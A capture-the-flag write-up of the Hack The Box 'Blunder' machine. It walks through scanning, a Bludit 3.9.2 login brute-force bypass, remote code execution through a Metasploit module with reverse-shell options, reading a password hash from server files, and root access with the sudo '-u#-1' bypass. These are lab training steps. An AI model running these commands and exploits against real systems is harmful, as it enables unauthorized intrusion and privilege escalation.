![](blunder-banner.png)

<p align="right">   <a href="https://www.hackthebox.eu/home/users/profile/391067" target="_blank"><img loading="lazy" alt="x00tex" src="http://www.hackthebox.eu/badge/image/391067"></img></a>
</p>

||
|-----------|
|Start with the nmap only found the web_server on port 80. running gobuster discovers __todo.txt__  and __admin__ page. In the txt file found username __fergus__ and from admin page found out that the server is running __Bludit-CMS__ and the running CMS version is vulnerable for __password bruteforce attack__ and __auth Directory Traversal__ vulnerability and after getting user fergus password using bruteforce attack i get shell as user __www-data__ with Directory Traversal vulnerability. After some enumeration found user __Hugo__ creds from the server files and get the __user_flag__. User hugo have all sudo rights and the sudo version in the box is vulnerable for sudo security bypass exploit and from that get the __Root_flag__.|

# Scanning

## Nmap

`ports=$(nmap -Pn -p- --min-rate=1000 -T4 10.10.10.191 | grep open | awk -F / '{print $1}' ORS=',') echo $ports && nmap -p$ports -sV -sC -v -T4 -oA scans/nmap.full 10.10.10.191`
```
PORT   STATE  SERVICE VERSION
21/tcp closed ftp
80/tcp open   http    Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: Blunder
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Blunder | A blunder of interesting facts
```
## Gobuster
`gobuster dir -u http://10.10.10.191 -w /usr/share/seclists/Discovery/Web-Content/common.txt -x txt,php -t 50`
```
/admin (Status: 301)
/todo.txt (Status: 200)
```
### /admin
- in the admin page I found [bludit CMS](https://github.com/bludit/bludit) admin login panel, 
- Looking at the source code, the CMS version is identified as `3.9.2`

### /todo.txt
`-Inform fergus that the new blog needs images - PENDING`

potential username __fergus__

## Google
__search :__ `bludit 3.9.2 vulnerability`

__*2 CVEs Found*__

__CVE-2019-17240__:*bl-kernel/security.class.php in Bludit 3.9.2 allows attackers to bypass a brute-force protection mechanism by using many different forged X-Forwarded-For or Client-IP HTTP headers.* 

__CVE-2019-16113 (1 Metasploit modules)__:*Bludit 3.9.2 allows remote code execution via bl-kernel/ajax/upload-images.php because PHP code can be entered with a .jpg file name, and then this PHP code can write other PHP code to a ../ pathname.* 

# User Exploiting

## CVE-2019-17240
__*Discoverer*__: Rastating
__*References*__: [rastating.github.io](https://rastating.github.io/bludit-brute-force-mitigation-bypass/) Blog post.

- requirements

  - __username:__ fergus
  - __wordlist:__ *create a wordlist from the website text*
  
        cewl http://10.10.10.191 -w wordlist


### POC Script

[bludit_3.9.2-Bruteforce.py](exploit/bludit_3.9.2-Bruteforce.py)
* [Wordlist](exploit/wordlist.txt) generated from webpage usubg cewl tool

*ippsec [video](https://www.youtube.com/watch?v=G5iw8c2vXuk&t=940s)*

#### creds

      fergus:RolandDeschain

## CVE-2019-16113
__*Discoverer*__: Christasa
__*References*__: [issue 1081](https://github.com/bludit/bludit/issues/1081)

- requirements

  - __username:__ fergus
  - __password:__ RolandDeschain


### Exploiting

#### using ExploitDB Script
  - Title: Bludit 3.9.2 - Directory Traversal
  - Author: James Green
  - EDB-ID: [48701](https://www.exploit-db.com/exploits/48701)

[Bludit_3.9.2-DirectoryTraversal.py](exploit/Bludit_3.9.2-DirectoryTraversal.py)

*ippsec [video](https://www.youtube.com/watch?v=G5iw8c2vXuk&t=2460s)*

#### MSF Module [Rapid7](https://www.rapid7.com/db/modules/exploit/linux/http/bludit_upload_images_exec)
> exploit/linux/http/bludit_upload_images_exec

	BLUDITPASS => RolandDeschain
	BLUDITUSER => fergus
	RHOSTS => 10.10.10.191
	LHOST => tun0

### low lavel user shell or meterpreter shell
	$ whoami;id
	www-data
	uid=33(www-data) gid=33(www-data) groups=33(www-data)

### spawn dumb shell, [ropnop.com blog](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys)

	$ which python
		/usr/bin/python
	# In reverse shell
	$ python -c 'import pty; pty.spawn("/bin/bash")'
	Ctrl-Z

	# In Kali
	$ stty raw -echo
	$ fg 	//Enter twice

	# In reverse shell
	$ reset
	$ export SHELL=bash
	$ export TERM=xterm-256color
	$ stty rows <num> columns <cols>

__for meterpreter shell upgrade :__ [hackingarticles.in blog](https://www.hackingarticles.in/command-shell-to-meterpreter/)

### Local Enumeration

- Home directory has 2 users

	  hugo	//has user flag
	  shaun

- in `/var/www/bludit-3.10.0a/bl-content/databases` directory

	  user.php	//contains Hugo's password hash

		"nickname": "Hugo",
		"password": "faca404fd5c0a31cf1897b823c695c85cffeb98d"
		//hash type SHA1
		
- creds

	  hugo:Password120

# Root Prevesc

- __Enumeration__

	  $ su - hugo
	  su - hugo
	  Password: Password120

	  hugo@blunder:~$ sudo -l
	  sudo -l
	  Password: Password120

	  Matching Defaults entries for hugo on blunder:
	      env_reset, mail_badpass,
	      secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

	  User hugo may run the following commands on blunder:
	      (ALL, !root) /bin/bash
	  hugo@blunder:~$ sudo -V
	  sudo -V
	  Sudo version 1.8.25p1


### Google
__search :__ `sudo ALL, !root privesc`

__*1 CVE Found*__

#### CVE-2019-14287

	# Exploit Title : sudo 1.8.27 - Security Bypass
	# Original Author: Joe Vennix
	# Exploit Author : Mohin Paramasivam (Shad0wQu35t)
	# Version : Sudo <1.2.28
	# Credit : Joe Vennix from Apple Information Security found and analyzed the bug

EDB-ID: [47502](https://www.exploit-db.com/exploits/47502)

- misconfigured sudo

	  $ sudo -l 
	  User hugo may run the following commands on blunder:
	      (ALL, !root) /bin/bash
    
__EXPLOIT :__ 

	$ sudo -u#-1 /bin/bash